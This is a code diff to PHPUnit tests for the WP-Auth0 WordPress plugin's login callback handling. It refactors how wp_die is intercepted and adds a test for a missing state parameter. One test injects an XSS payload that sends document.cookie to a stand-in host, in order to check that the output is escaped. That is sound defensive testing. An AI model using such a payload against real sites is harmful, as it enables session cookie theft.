@@ -19,6 +19,8 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 
 	use UsersHelper;
 
+	use WpDieHelper;
+
 	/**
 	 * WP_Auth0_LoginManager instance to test.
 	 *
@@ -32,52 +34,24 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 	public function setUp() {
 		parent::setUp();
 		$this->login = new WP_Auth0_LoginManager( new WP_Auth0_UsersRepo( self::$opts ), self::$opts );
-		add_filter( 'wp_die_handler', [ 'TestLoginManagerInitAuth0', 'wp_die_handler' ] );
-	}
-
-	/**
-	 * Runs after each test method.
-	 */
-	public function tearDown() {
-		parent::tearDown();
-		remove_filter( 'wp_die_handler', [ 'TestLoginManagerInitAuth0', 'wp_die_handler' ] );
-	}
-
-	/**
-	 * Provide the function to handle wp_die.
-	 *
-	 * @return array
-	 */
-	public static function wp_die_handler() {
-		return [ 'TestLoginManagerInitAuth0', 'wp_die_die' ];
-	}
-
-	/**
-	 * Handle wp_die.
-	 *
-	 * @param string $html - Passed-in HTML to display.
-	 *
-	 * @throws \Exception - Always.
-	 */
-	public static function wp_die_die( $html ) {
-		throw new Exception( $html );
 	}
 
 	/**
 	 * Test that Auth0 is not initialized if the plugin is not ready or if the callback URL is not correct.
 	 */
 	public function testThatNothingHappensIfNotReady() {
-		$this->assertFalse( $this->login->init_auth0() );
+		$this->startWpDieHalting();
+		$this->assertFalse( wp_auth0_process_auth_callback() );
 		$_REQUEST['auth0'] = 1;
-		$this->assertFalse( $this->login->init_auth0() );
+		$this->assertFalse( wp_auth0_process_auth_callback() );
 		self::auth0Ready( true );
 		unset( $_REQUEST['auth0'] );
-		$this->assertFalse( $this->login->init_auth0() );
+		$this->assertFalse( wp_auth0_process_auth_callback() );
 
 		$output = '';
 		try {
 			$_REQUEST['auth0'] = 1;
-			$this->login->init_auth0();
+			wp_auth0_process_auth_callback();
 		} catch ( Exception $e ) {
 			$output = $e->getMessage();
 		}
@@ -89,6 +63,8 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 	 * Test that an error in the URL parameter stops the callback with an error.
 	 */
 	public function testThatErrorInUrlStopsCallback() {
+		$this->startWpDieHalting();
+
 		self::$opts->set( 'domain', 'test.auth0.com' );
 		self::$opts->set( 'client_id', '__test_client_id__' );
 		self::$opts->set( 'client_secret', uniqid() );
@@ -98,7 +74,7 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 
 		$output = '';
 		try {
-			$this->login->init_auth0();
+			wp_auth0_process_auth_callback();
 		} catch ( Exception $e ) {
 			$output = $e->getMessage();
 		}
@@ -114,6 +90,8 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 	 * Test that an error in the URL parameter logs the current user out.
 	 */
 	public function testThatErrorInUrlLogsUserOut() {
+		$this->startWpDieHalting();
+
 		self::auth0Ready();
 		$_REQUEST['auth0']             = 1;
 		$_REQUEST['error']             = uniqid();
@@ -121,7 +99,7 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 		$this->setGlobalUser();
 
 		try {
-			$this->login->init_auth0();
+			wp_auth0_process_auth_callback();
 		} catch ( Exception $e ) {
 			// Just need to call the above ...
 		}
@@ -133,6 +111,8 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 	 * Test that an error in the URL parameter does not allow XSS.
 	 */
 	public function testThatErrorInUrlAvoidsXss() {
+		$this->startWpDieHalting();
+
 		self::auth0Ready();
 		$_REQUEST['auth0']             = 1;
 		$_REQUEST['error']             = '<script>window.location="xss.com?cookie="+document.cookie</script>';
@@ -140,7 +120,7 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 
 		$output = '';
 		try {
-			$this->login->init_auth0();
+			wp_auth0_process_auth_callback();
 		} catch ( Exception $e ) {
 			$output = $e->getMessage();
 		}
@@ -152,6 +132,8 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 	 * Test that a logged-in user is redirected from the callback without any processing.
 	 */
 	public function testThatLoggedInUserIsRedirected() {
+		$this->startWpDieHalting();
+
 		$this->startRedirectHalting();
 		$_REQUEST['auth0'] = 1;
 		self::auth0Ready();
@@ -159,7 +141,7 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 
 		$caught_redirect = [];
 		try {
-			$this->login->init_auth0();
+			wp_auth0_process_auth_callback();
 		} catch ( Exception $e ) {
 			$caught_redirect = unserialize( $e->getMessage() );
 		}
@@ -168,17 +150,47 @@ class TestLoginManagerInitAuth0 extends WP_Auth0_Test_Case {
 	}
 
 	/**
-	 * Test that invalid state stops the callback with an error.
+	 * Test that missing state stops the callback with an error.
 	 */
-	public function testThatInvalidStateStopsCallback() {
-		$_REQUEST['auth0'] = 1;
+	public function testThatMissingStateStopsCallback() {
+		$this->startWpDieHalting();
+
 		self::$opts->set( 'domain', 'test.auth0.com' );
 		self::$opts->set( 'client_id', '__test_client_id__' );
 		self::$opts->set( 'client_secret', uniqid() );
+		$_REQUEST['auth0'] = 1;
 
 		$output = '';
 		try {
-			$this->login->init_auth0();
+			wp_auth0_process_auth_callback();
+		} catch ( Exception $e ) {
+			$output = $e->getMessage();
+		}
+
+		$this->assertContains( 'There was a problem with your log in', $output );
+		$this->assertContains( 'Missing state', $output );
+		$this->assertContains( 'error code', $output );
+		$this->assertContains( 'unknown', $output );
+		$this->assertContains( '<a href="https://test.auth0.com/v2/logout?client_id=__test_client_id__', $output );
+	}
+
+	/**
+	 * Test that missing state stops the callback with an error.
+	 */
+	public function testThatInvalidStateStopsCallback() {
+		$this->startWpDieHalting();
+
+		self::$opts->set( 'domain', 'test.auth0.com' );
+		self::$opts->set( 'client_id', '__test_client_id__' );
+		self::$opts->set( 'client_secret', uniqid() );
+		$_REQUEST['auth0'] = 1;
+		$_GET['state']     = '__invalid_state__';
+
+		$output = '';
+		try {
+			// Need to suppress header warning for cookie setting.
+			// phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged
+			@wp_auth0_process_auth_callback();
 		} catch ( Exception $e ) {
 			$output = $e->getMessage();
 		}
